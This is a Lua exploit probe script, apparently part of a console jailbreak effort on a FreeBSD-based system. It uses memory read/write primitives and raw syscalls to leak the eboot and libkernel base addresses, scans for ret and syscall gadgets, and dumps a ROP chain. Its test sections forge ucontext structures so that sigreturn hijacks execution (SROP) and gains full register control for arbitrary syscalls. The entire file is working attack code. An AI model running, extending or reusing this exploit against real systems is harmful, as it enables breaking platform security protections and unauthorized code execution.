-- CRASH_CLASS: HIGH (sigreturn replaces all registers — one-way trip)
-- PROBE 106a: SROP via sigreturn(417) — FULL REGISTER CONTROL
--
-- Context:
--   Probe 22 confirmed sigreturn(417) RESOLVED on 14.10 but NEVER CALLED.
--   Sigreturn takes a ucontext_t* and restores ALL registers from it:
--   RIP, RSP, RAX, RDI, RSI, RDX, RCX, R8-R15, CS, SS, RFLAGS.
--   Combined with libkernel's syscall instruction (XO but jumpable):
--   this gives ARBITRARY SYSCALL with controlled arguments, bypassing
--   the Lua dispatch entirely.
--
--   From thr_create root cause (PR #30/#31): CS at ctx+0xC0, SS at ctx+0x100.
--   sigreturn uses the same set_mcontext() function.
--
-- Section A: Does sigreturn via make_syscall work? (crash/return/noop test)
-- Section B: getmcontext(78) + modified sigreturn round-trip attempt
-- Section C: SROP crash test (RIP=0xDEAD to prove register takeover)
-- Section D: Find syscall instruction address in ROP chain path

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 106a: SIGRETURN SROP — REGISTER CONTROL ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end

-- Get module bases
local sc593 = make_syscall(593)
local sc20 = make_syscall(20)
local sc624 = make_syscall(624)

local ok_pid, pid = pcall(function() return sc20() end)
local our_pid = ok_pid and to_num(pid) or 0
print("PID: " .. our_pid)

-- Get eboot base
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc593(uint64(0), info) end)
local eboot_lo = safe_rd(info + 0x108) or 0
local eboot_hi = safe_rd(info + 0x10C) or 0
local eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
print("eboot_base: " .. fmt(eboot_base))

-- Get libkernel base
safe_wd(info, 0x160)
pcall(function() sc593(uint64(1), info) end)
local lk_lo = safe_rd(info + 0x108) or 0
local lk_hi = safe_rd(info + 0x10C) or 0
local libkernel_base = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
print("libkernel_base: " .. fmt(libkernel_base))

-- Get ROP chain address from pipe object
local pipe_str = tostring(syscall.pipe)
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local rop_addr = rop_str and uint64(rop_str) or uint64(0)
local fn_addr = fn_str and uint64(fn_str) or uint64(0)
print("rop_chain: " .. (rop_str or "nil"))
print("fn_addr: " .. (fn_str or "nil"))

-- Find a ret gadget in eboot (scan for 0xC3)
print("")
print("Scanning eboot for ret gadget (0xC3):")
local ret_gadget = nil
for off = 0x1000, 0x100000, 0x100 do
    local b = safe_rb(eboot_base + uint64(off))
    if b == 0xC3 then
        ret_gadget = eboot_base + uint64(off)
        print("  Found ret at eboot+" .. string.format("0x%X", off))
        break
    end
end
if not ret_gadget then
    print("  No ret gadget found — FATAL")
    return
end

-- Allocate GPU mmap for our controlled stack
local sc477 = make_syscall(477)
local gpu = nil
local ok_mmap, rv_mmap = pcall(function()
    return sc477(uint64(0), uint64(64 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if ok_mmap and to_num(rv_mmap) ~= 0 then
    gpu = rv_mmap
    print("GPU mmap: " .. fmt(gpu))
else
    print("GPU mmap FAILED — using heap instead")
    gpu = memory.alloc(0x10000)
    print("Heap fallback: " .. fmt(gpu))
end
print("")

if TEST_SECTION == "A" then
    print("--- Section A: Basic sigreturn(417) test ---")
    print("  Does make_syscall(417) crash, return -1, or do something?")
    print("")

    local sc417 = make_syscall(417)  -- sigreturn

    -- FreeBSD sigreturn arg: pointer to ucontext_t
    -- ucontext_t layout (FreeBSD amd64):
    --   +0x00: uc_sigmask (16 bytes, sigset_t)
    --   +0x10: uc_mcontext (mcontext_t)
    --     mcontext_t:
    --       +0x00: mc_onstack
    --       +0x08: mc_rdi
    --       +0x10: mc_rsi
    --       +0x18: mc_rdx
    --       +0x20: mc_rcx
    --       +0x28: mc_r8
    --       +0x30: mc_r9
    --       +0x38: mc_rax
    --       +0x40: mc_rbx
    --       +0x48: mc_rbp
    --       +0x50: mc_r10
    --       +0x58: mc_r11
    --       +0x60: mc_r12
    --       +0x68: mc_r13
    --       +0x70: mc_r14
    --       +0x78: mc_r15
    --       +0x80: mc_trapno
    --       +0x84: mc_fs
    --       +0x86: mc_gs
    --       +0x88: mc_addr
    --       +0x90: mc_flags (set _MC_HASSEGS = 0x1, _MC_HASBASES = 0x4)
    --       +0x94: mc_es
    --       +0x96: mc_ds
    --       +0x98: mc_err
    --       +0xA0: mc_rip
    --       +0xA8: mc_cs
    --       +0xB0: mc_rflags
    --       +0xB8: mc_rsp
    --       +0xC0: mc_ss
    --       +0xC8: mc_len (= sizeof mcontext)
    --       +0xD0: mc_fpformat
    --       +0xD8: mc_ownedfp
    --       +0xE0: mc_fpstate[64] (512 bytes)
    --       +0x2E0: mc_fsbase
    --       +0x2E8: mc_gsbase
    --
    -- BUT: thr_create analysis says CS at ctx+0xC0, SS at ctx+0x100
    -- This means mcontext starts at a DIFFERENT offset or the layout differs
    -- Two possibilities:
    --   A) thr_create uses raw mcontext (no uc_sigmask prefix)
    --   B) Sony's mcontext layout differs from stock FreeBSD
    --
    -- We test BOTH layouts

    -- Layout 1: Standard FreeBSD ucontext (mcontext at +0x10)
    print("[A1] Layout 1: Standard FreeBSD ucontext_t:")
    local uc1 = memory.alloc(0x400)
    for i = 0, 0x3FF, 4 do safe_wd(uc1 + i, 0) end

    -- Set key fields (mcontext at uc+0x10)
    local mc1 = uc1 + 0x10
    safe_wq(mc1 + 0xA0, ret_gadget)     -- mc_rip = ret gadget
    safe_wd(mc1 + 0xA8, 0x43)           -- mc_cs = user code
    safe_wd(mc1 + 0xB0, 0x202)          -- mc_rflags = IF
    safe_wq(mc1 + 0xB8, gpu + uint64(0x8000))  -- mc_rsp = GPU stack middle
    safe_wd(mc1 + 0xC0, 0x3B)           -- mc_ss = user stack
    safe_wd(mc1 + 0x90, 0x5)            -- mc_flags = HASSEGS|HASBASES
    safe_wd(mc1 + 0x84, 0x13)           -- mc_fs (user FS)
    safe_wd(mc1 + 0x86, 0x1B)           -- mc_gs (user GS)
    safe_wd(mc1 + 0x94, 0x3B)           -- mc_es
    safe_wd(mc1 + 0x96, 0x3B)           -- mc_ds
    safe_wq(mc1 + 0x38, uint64(0x42424242))  -- mc_rax = marker

    -- Put a ret addr on the GPU "stack" (points to another ret → crash)
    safe_wq(gpu + uint64(0x8000), ret_gadget)       -- return to ret
    safe_wq(gpu + uint64(0x8008), uint64(0xDEAD))   -- then crash at 0xDEAD

    print("  uc1 addr: " .. fmt(uc1))
    print("  mc_rip: " .. fmt(ret_gadget))
    print("  mc_rsp: " .. fmt(gpu + uint64(0x8000)))
    print("  mc_rax: 0x42424242")
    print("")
    print("  [BEFORE_SIGRETURN_1]")
    local ok1, rv1 = pcall(function() return sc417(uint64(uc1)) end)
    print("  [AFTER_SIGRETURN_1]")
    print(string.format("  ret=%s ok=%s",
        ok1 and fmt(rv1) or "PCALL-FAIL", tostring(ok1)))
    print("")

    -- Layout 2: thr_create style (CS at +0xC0, SS at +0x100 from ctx start)
    print("[A2] Layout 2: thr_create offsets (CS@+0xC0, SS@+0x100):")
    local uc2 = memory.alloc(0x400)
    for i = 0, 0x3FF, 4 do safe_wd(uc2 + i, 0) end

    -- These offsets are from the thr_create analysis
    -- If thr_create takes a ucontext_t (not raw mcontext):
    --   CS at uc+0xC0 means mc_cs is at mcontext+0xB0 if mc starts at +0x10
    --   OR mc_cs is at offset 0xC0 in a raw mcontext (no uc_sigmask prefix)
    -- The thr_create analysis uses ctx directly, suggesting raw mcontext or
    -- a ucontext where uc_sigmask is smaller (8 bytes? 0 bytes?)

    -- Try: sigreturn with mcontext at offset 0 (no uc_sigmask prefix)
    -- This matches thr_create: CS at +0xC0, SS at +0x100
    -- Then RIP would be at 0xC0-0x08 = +0xB8? Or at the standard mcontext
    -- offset 0xA0 (which would put CS at +0xA8, not +0xC0)

    -- Actually: if CS is at uc+0xC0, and standard mc_cs is at mc+0xA8,
    -- then mc starts at uc+0x18 (0xC0-0xA8=0x18), suggesting uc_sigmask=0x18
    -- OR: if thr_create uses raw mcontext and CS is at mc+0xC0,
    -- this is a Sony-extended mcontext with different offsets

    -- Test raw mcontext (no uc_sigmask prefix) with thr_create offsets
    -- CS at +0xC0, SS at +0x100, RIP would be at +0xC0-8=+0xB8 (adjacent to CS)
    -- OR: walk from CS backwards: on x86-64 trapframe, order is
    -- ..., RIP, CS, RFLAGS, RSP, SS
    -- So if CS=+0xC0: RIP=+0xB8, RFLAGS=+0xC8, RSP=+0xD0, SS=+0xD8
    -- But thr_create says SS=+0x100, which is 0x100-0xC0=0x40 after CS
    -- That's WAY too far for adjacent fields. So the layout isn't standard.

    -- Let's try: RIP at +0xB8 (8 before CS@+0xC0), RSP at +0xF8 (8 before SS@+0x100)
    safe_wq(uc2 + 0xB8, ret_gadget)             -- RIP (guessed)
    safe_wd(uc2 + 0xC0, 0x43)                   -- CS = 0x43 (CONFIRMED offset)
    safe_wd(uc2 + 0xC8, 0x202)                  -- RFLAGS (guessed)
    safe_wq(uc2 + 0xD0, gpu + uint64(0x9000))   -- RSP (guessed)
    safe_wd(uc2 + 0xD8, 0x3B)                   -- SS (guessed)
    -- Also try the confirmed SS offset
    safe_wd(uc2 + 0x100, 0x3B)                  -- SS at thr_create offset

    -- Fill the stack
    safe_wq(gpu + uint64(0x9000), ret_gadget)
    safe_wq(gpu + uint64(0x9008), uint64(0xDEAD))

    print("  uc2 addr: " .. fmt(uc2))
    print("  RIP@+0xB8: " .. fmt(ret_gadget))
    print("  CS@+0xC0: 0x43")
    print("  SS@+0x100: 0x3B")
    print("")
    print("  [BEFORE_SIGRETURN_2]")
    local ok2, rv2 = pcall(function() return sc417(uint64(uc2)) end)
    print("  [AFTER_SIGRETURN_2]")
    print(string.format("  ret=%s ok=%s",
        ok2 and fmt(rv2) or "PCALL-FAIL", tostring(ok2)))
    print("")

    -- Stability
    print("[A3] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section A complete")
    print("  If 'AFTER_SIGRETURN' is missing for either layout,")
    print("  sigreturn took over execution = SROP WORKS")

elseif TEST_SECTION == "B" then
    print("--- Section B: getmcontext(78) + round-trip sigreturn ---")
    print("  Save current state, modify RAX only, restore via sigreturn")
    print("  If RAX changes but Lua survives = register control CONFIRMED")
    print("")

    local sc78 = make_syscall(78)    -- getcontext (sigprocmask variant?)
    local sc417 = make_syscall(417)  -- sigreturn

    -- getcontext on FreeBSD: fills a ucontext_t with current state
    -- On FreeBSD, getcontext is syscall 421 (swapcontext), not 78
    -- Actually sys 78 is "minherit" on FreeBSD
    -- The correct syscalls:
    --   getcontext = not a syscall; it's libc
    --   swapcontext = 421
    --   sigreturn = 417
    -- But probe 22 mentions "sigaltstack" not "getcontext"
    -- We need another way to get current register state

    -- Alternative: use the ROP chain's saved state
    -- The chain has a longjmp buffer that saves/restores state
    -- Read the longjmp buffer to get current-ish register values

    print("[B1] Reading ROP chain longjmp buffer:")
    -- longjmp at chain+0x278 (from 56g data)
    local chain = rop_addr
    local ljmp_offset = 0x278
    local ljmp_addr = safe_rq(chain + uint64(ljmp_offset))
    print("  longjmp addr: " .. (ljmp_addr and fmt(ljmp_addr) or "nil"))

    -- Read the chain's return_addr area (might have saved state)
    local ret_addr_area = fn_addr  -- fn_addr is near the saved state
    print("  fn_addr area: " .. fmt(fn_addr))

    -- Dump 128 bytes around fn_addr looking for saved registers
    print("[B2] fn_addr area dump (potential saved state):")
    for off = -0x40, 0x40, 8 do
        local v = safe_rq(fn_addr + uint64(off))
        if v then
            local h, l = get_hi_lo(v)
            local label = ""
            if h >= 0x00000002 and h <= 0x0000000F then
                label = " (stack/heap range)"
            elseif h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                label = " *** KERNEL PTR ***"
            end
            print(string.format("  fn_addr%+d: %s%s", off, fmt(v), label))
        end
    end
    print("")

    -- Try swapcontext(421) to save current state
    print("[B3] Try swapcontext(421) to save state:")
    local sc421 = make_syscall(421)
    local save_uc = memory.alloc(0x400)
    local new_uc = memory.alloc(0x400)
    for i = 0, 0x3FF, 4 do
        safe_wd(save_uc + i, 0xAA)
        safe_wd(new_uc + i, 0)
    end

    -- swapcontext(old_ucp, new_ucp) — saves to old, loads from new
    -- We only want to save, not load, so set new_ucp to 0 or same
    -- Actually, getcontext in libc just calls getcontext(uc) not swapcontext
    -- But getcontext might be a libc wrapper, not a raw syscall

    -- On FreeBSD: sys_getcontext is syscall 421
    -- Wait, looking at FreeBSD sysent:
    --   417 = sigreturn
    --   418-420 = various
    --   421 = getcontext (NOT swapcontext)
    --   422 = setcontext

    -- Try sys 421 = getcontext
    print("  Calling getcontext(421):")
    local ok_gc, rv_gc = pcall(function() return sc421(uint64(save_uc)) end)
    print(string.format("  getcontext: ret=%s ok=%s",
        ok_gc and fmt(rv_gc) or "PCALL-FAIL", tostring(ok_gc)))

    if ok_gc and to_num(rv_gc) == 0 then
        print("  *** GETCONTEXT WORKS! ***")
        -- Dump the saved context to find register layout
        print("[B4] Saved ucontext dump:")
        for off = 0, 0x120, 8 do
            local v = safe_rq(save_uc + uint64(off))
            if v then
                local h, l = get_hi_lo(v)
                local label = ""
                if l == 0x43 and h == 0 then label = " (CS=0x43?)"
                elseif l == 0x3B and h == 0 then label = " (SS=0x3B?)"
                elseif l == 0x202 and h == 0 then label = " (RFLAGS=IF?)"
                elseif h >= 0x00000002 and h <= 0x0000000F then
                    label = " (code/stack addr)"
                elseif h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    label = " *** KERNEL PTR ***"
                end
                print(string.format("    +0x%03X: %s%s", off, fmt(v), label))
            end
        end
        print("")

        -- Now modify RAX and call sigreturn
        print("[B5] Modify RAX in saved context, call sigreturn:")
        -- First find where RAX is in the saved context
        -- Standard FreeBSD: mc_rax at mcontext+0x38 = uc+0x48
        local saved_rax = safe_rq(save_uc + 0x48)
        print("  Saved RAX (uc+0x48): " .. (saved_rax and fmt(saved_rax) or "nil"))

        -- Copy saved context and modify RAX
        local mod_uc = memory.alloc(0x400)
        for i = 0, 0x3FF, 4 do
            local v = safe_rd(save_uc + i)
            safe_wd(mod_uc + i, v or 0)
        end
        safe_wq(mod_uc + 0x48, uint64(0x42424242))  -- mc_rax = marker

        print("  Modified RAX to 0x42424242")
        print("  [BEFORE_SIGRETURN_ROUNDTRIP]")
        local ok_sr, rv_sr = pcall(function() return sc417(uint64(mod_uc)) end)
        print("  [AFTER_SIGRETURN_ROUNDTRIP]")
        print(string.format("  ret=%s ok=%s",
            ok_sr and fmt(rv_sr) or "PCALL-FAIL", tostring(ok_sr)))
        -- If we see AFTER, sigreturn either failed or restored us properly
        -- If we DON'T see AFTER, sigreturn replaced registers
    else
        print("  getcontext failed — try sys 421 as swapcontext variant")
    end
    print("")

    -- Stability
    print("[B6] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: SROP crash test — prove register takeover ---")
    print("  Set RIP=0xDEAD. If connection drops = sigreturn took control.")
    print("  This is a ONE-WAY test. No return to Lua.")
    print("")

    local sc417 = make_syscall(417)

    -- First attempt: use getcontext(421) to save current state
    local sc421 = make_syscall(421)
    local base_uc = memory.alloc(0x400)
    for i = 0, 0x3FF, 4 do safe_wd(base_uc + i, 0) end

    local ok_gc, rv_gc = pcall(function() return sc421(uint64(base_uc)) end)
    local have_context = ok_gc and to_num(rv_gc) == 0

    if have_context then
        print("[C1] Using getcontext-saved state + modified RIP:")
        -- Copy and modify
        local crash_uc = memory.alloc(0x400)
        for i = 0, 0x3FF, 4 do
            local v = safe_rd(base_uc + i)
            safe_wd(crash_uc + i, v or 0)
        end

        -- Standard FreeBSD layout: mc_rip at uc+0x10+0xA0 = uc+0xB0
        safe_wq(crash_uc + 0xB0, uint64(0xDEAD))  -- RIP = crash address
        safe_wq(crash_uc + 0x48, uint64(0x42424242))  -- RAX = marker

        print("  mc_rip(uc+0xB0) = 0xDEAD")
        print("  mc_rax(uc+0x48) = 0x42424242")
        print("  All other registers preserved from getcontext")
        print("")
        print("  [BEFORE_SROP_CRASH]")
        local ok_c, rv_c = pcall(function() return sc417(uint64(crash_uc)) end)
        print("  [AFTER_SROP_CRASH]")
        print("  ret=" .. (ok_c and fmt(rv_c) or "PCALL-FAIL"))
    else
        print("[C1] No getcontext — using manual ucontext:")
        local crash_uc = memory.alloc(0x400)
        for i = 0, 0x3FF, 4 do safe_wd(crash_uc + i, 0) end

        -- Try standard FreeBSD layout (mcontext at +0x10)
        local mc = crash_uc + 0x10
        safe_wq(mc + 0xA0, uint64(0xDEAD))          -- mc_rip
        safe_wd(mc + 0xA8, 0x43)                     -- mc_cs
        safe_wd(mc + 0xB0, 0x202)                    -- mc_rflags
        safe_wq(mc + 0xB8, gpu + uint64(0x8000))     -- mc_rsp
        safe_wd(mc + 0xC0, 0x3B)                     -- mc_ss
        safe_wd(mc + 0x90, 0x5)                      -- mc_flags
        safe_wq(mc + 0x38, uint64(0x42424242))        -- mc_rax

        print("  mc_rip = 0xDEAD")
        print("  mc_rax = 0x42424242")
        print("  mc_cs = 0x43, mc_ss = 0x3B")
        print("")
        print("  [BEFORE_SROP_CRASH]")
        local ok_c, rv_c = pcall(function() return sc417(uint64(crash_uc)) end)
        print("  [AFTER_SROP_CRASH]")
        print("  ret=" .. (ok_c and fmt(rv_c) or "PCALL-FAIL"))
    end
    print("")

    -- If we get here, sigreturn didn't take over
    print("[C2] Stability (sigreturn was blocked/noop'd):")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section C complete")
    print("  RESULT KEY:")
    print("    BEFORE visible, AFTER missing = SROP WORKS (RIP hijacked)")
    print("    BEFORE visible, AFTER visible = sigreturn blocked or noop")

elseif TEST_SECTION == "D" then
    print("--- Section D: Find syscall instruction in dispatch path ---")
    print("  Read ROP chain call targets to find where syscall happens")
    print("")

    -- Dump the entire ROP chain looking for the syscall call target
    local chain = rop_addr
    print("[D1] Full ROP chain dump (0x2F0 bytes):")
    for off = 0, 0x2F0 - 8, 8 do
        local v = safe_rq(chain + uint64(off))
        if v then
            local h, l = get_hi_lo(v)
            -- Check if this points into eboot .text (readable)
            local in_eboot = false
            if eboot_hi == h or (h == eboot_hi and l >= eboot_lo) then
                in_eboot = true
            end

            local label = ""
            local bytes = ""
            -- Try to read first 4 bytes at target to identify gadget
            if in_eboot or (h >= 2 and h <= 0xF) then
                local b0 = safe_rb(v)
                local b1 = safe_rb(v + uint64(1))
                local b2 = safe_rb(v + uint64(2))
                local b3 = safe_rb(v + uint64(3))
                if b0 then
                    bytes = string.format(" [%02X %02X %02X %02X]",
                        b0, b1 or 0, b2 or 0, b3 or 0)
                    if b0 == 0xC3 then label = " <ret>"
                    elseif b0 == 0x58 then label = " <pop rax>"
                    elseif b0 == 0x5F then label = " <pop rdi>"
                    elseif b0 == 0x5E then label = " <pop rsi>"
                    elseif b0 == 0x5A then label = " <pop rdx>"
                    elseif b0 == 0x5C then label = " <pop rsp>"
                    elseif b0 == 0x41 and b1 == 0x58 then label = " <pop r8>"
                    elseif b0 == 0x0F and b1 == 0x05 then
                        label = " *** SYSCALL ***"
                    elseif b0 == 0x48 and b1 == 0x8B and b2 == 0x00 then
                        label = " <mov rax,[rax]>"
                    elseif b0 == 0x48 and b1 == 0x89 and b2 == 0x07 then
                        label = " <mov [rdi],rax>"
                    elseif b0 == 0xFF and b1 == 0xE0 then
                        label = " <jmp rax>"
                    elseif b0 == 0xFF and b1 == 0xD0 then
                        label = " <call rax>"
                    end
                end
            end

            -- Check if it points into libkernel range
            if h == lk_hi then
                label = label .. " [LIBKERNEL]"
            end

            print(string.format("  chain+0x%03X: %s%s%s", off, fmt(v), bytes, label))
        end
    end
    print("")

    -- Also scan argument slots area
    print("[D2] Argument slots area:")
    -- From 56g: arg slots at 0x311184040-0x3111840b0
    -- That's fn_addr - some offset. Try reading around fn_addr
    local arg_base = fn_addr - uint64(0x1F90)  -- approximate from 56g offsets
    for off = 0, 0x80, 8 do
        local v = safe_rq(arg_base + uint64(off))
        if v then
            print(string.format("  args+0x%02X: %s", off, fmt(v)))
        end
    end
    print("")

    -- Search eboot .text for syscall instruction (0F 05)
    print("[D3] Expanded eboot scan for syscall (0F 05):")
    local found_syscall = false
    -- Scan wider range (entire eboot .text, up to 4MB)
    for off = 0x1000, 0x400000, 2 do
        local b0 = safe_rb(eboot_base + uint64(off))
        if b0 == nil then break end  -- past readable area
        if b0 == 0x0F then
            local b1 = safe_rb(eboot_base + uint64(off + 1))
            if b1 == 0x05 then
                local b2 = safe_rb(eboot_base + uint64(off + 2))
                local after = ""
                if b2 == 0xC3 then after = " + ret (PERFECT GADGET!)"
                elseif b2 == 0x48 then after = " + 48..."
                else after = string.format(" + %02X", b2 or 0)
                end
                print(string.format("  SYSCALL at eboot+0x%X%s",
                    off, after))
                found_syscall = true
                if b2 == 0xC3 then
                    print("  *** SYSCALL;RET FOUND IN EBOOT ***")
                    print("  Address: " .. fmt(eboot_base + uint64(off)))
                end
            end
        end
        -- Progress every 256KB
        if off % 0x40000 == 0 then
            print(string.format("  ... scanned to eboot+0x%X", off))
        end
    end
    if not found_syscall then
        print("  No syscall in eboot .text (confirms prior partial scan)")
    end
    print("")

    -- Stability
    print("[D4] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section D complete")
end

print("")
print("=== PROBE 106a COMPLETE ===")
